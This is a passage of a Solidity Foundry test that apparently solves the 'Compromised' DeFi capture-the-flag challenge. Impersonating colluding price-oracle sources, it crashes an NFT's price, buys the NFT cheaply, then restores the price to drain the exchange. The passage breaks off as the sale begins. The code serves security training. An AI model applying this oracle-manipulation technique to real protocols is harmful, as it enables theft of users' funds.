...
contract CompromisedChallenge is Test {
    ...
    /**
     * CHECKS INITIAL CONDITIONS - DO NOT TOUCH
     */
    ...
    function test_compromised() public checkSolved {
        // collusion between 2 trusted sources, tank the price
        ...
        // player buys the NTF at tanked price
        vm.startPrank(player);
        uint256 id = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
        vm.stopPrank();

        // collusion between 2 trusted sources, set the price back on
        vm.startPrank(sources[0]);
        oracle.postPrice(nft.symbol(), EXCHANGE_INITIAL_ETH_BALANCE + PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
        ...
        // player sells the NTF at full recovered price
        vm.startPrank(player);
